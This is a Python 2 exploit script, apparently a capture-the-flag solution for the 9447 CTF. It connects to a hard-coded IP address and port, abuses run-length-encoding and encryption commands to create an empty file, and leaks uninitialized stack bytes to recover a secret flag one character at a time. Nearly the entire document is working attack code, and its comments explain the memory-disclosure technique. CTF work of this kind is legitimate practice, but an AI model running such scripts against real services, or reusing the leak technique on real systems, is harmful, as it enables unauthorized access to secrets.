#!/usr/bin/python
import os
import struct
import socket
import telnetlib
import string

FLAG_LEN = 46

# motd.txt encrypted/compressed with a key of \x00
rle_motd = ''.join('''
1d2a 010a 012a 1b20 012a 010a 012a 0220
0157 0165 016c 0163 016f 016d 0165 0120
0174 016f 0120 0153 0165 0163 0175 0172
0165 0153 0174 016f 0172 0165 0121 0220
012a 010a 012a 1b20 012a 010a 1d2a 010a
'''.split()).decode('hex')

def readuntil(f, delim='$ '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def save(f, filename, key):
    f.write('save %s\n' % filename)
    f.write('%d\n' % len(key))
    f.write(key)
    readuntil(f)

def save_n(f, filenames, keys):
    f.write(' '.join('save ' + f for f in filenames) + '\n')
    for k in keys:
        f.write('%d\n' % len(k))
        f.write(k)
    readuntil(f)

def load(f, filename, key):
    f.write('load %s\n' % filename)
    f.write('%d\n' % len(key))
    f.write(key)
    readuntil(f)

NOT_EXIST = 0
NON_EMPTY = 1
EMPTY = 2

def exists(f, filename):
    f.write('exists %s\n' % filename)
    data = f.readline().strip()
    readuntil(f)
    if data == 'The file does not exist':
        return NOT_EXIST
    elif data == 'The file exists':
        return NON_EMPTY
    elif data == 'The file exists, but is empty':
        return EMPTY
    else:
        print 'Received invalid response:' + data
        assert(False)

def make(flag_key):
    return ''.join(map(chr, flag_key))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.149.33.9', 12345))
f = s.makefile('rw', bufsize=0)

username = os.urandom(4).encode('hex')

f.readline()
f.write(username + '\n')
readuntil(f)

# Create a 0 length file by saving motd, then decrypting it with a key
# such that all of the run lengths become 0.
save(f, 'motd.txt', '\x00')
load(f, 'motd.txt', rle_motd)

charset = string.lowercase + string.digits + '_{}' + string.uppercase

flag = '}'
flag_key = [0] * FLAG_LEN

flag = '9447{rUn_13ngt4_pFFFFFF_M0R3_11KE_DuMb_l3ng1h}'
flag_key = [68, 73, 73, 74, 6, 15, 40, 19, 34, 76, 78, 19, 26, 9, 73, 34, 13, 59, 59, 59, 59, 59, 59, 34, 48, 77, 47, 78, 34, 76, 76, 54, 56, 34, 57, 8, 48, 31, 34, 17, 78, 19, 26, 76, 21, 0]

old_run_len = len(flag)
while len(flag) < FLAG_LEN:
    idx = FLAG_LEN - len(flag) - 1
    for c in charset:
        print 'trying:', c
        flag_key[idx] = ord(c) ^ ord(flag[-1])

        # When motd.txt is empty, the save function writes 2
        # uninitialized bytes, one of which is the run length in the
        # last run in the previously saved file (in this case,
        # flag.txt). We give both save commands in one line to minimize
        # the amount of code that can run and clobber our uninit stack
        # in between the two saves.
        save_n(f, ['flag.txt', 'motd.txt'], [make(flag_key), '\x00'])

        # Now motd.txt.comp contains two bytes, the first of which is
        # the run length of the last run of flag. Leak out this value by
        # decrypting it with all possible keys until motd.txt becomes
        # empty.
        run_len = None
        for j in xrange(old_run_len, FLAG_LEN + 1):
            load(f, 'motd.txt', chr(j))
            if exists(f, 'motd.txt') == EMPTY:
                run_len = j
                break
        assert run_len is not None
        old_run_len = run_len

        # If we have made the run longer, then we have successfully
        # leaked a byte of the flag.
        if run_len > len(flag):
            print 'got run:', run_len
            flag = c * (run_len - len(flag)) + flag
            print 'flag =', repr(flag)
            print 'flag_key =', flag_key
            break

print 'Flag:', flag

f.close()
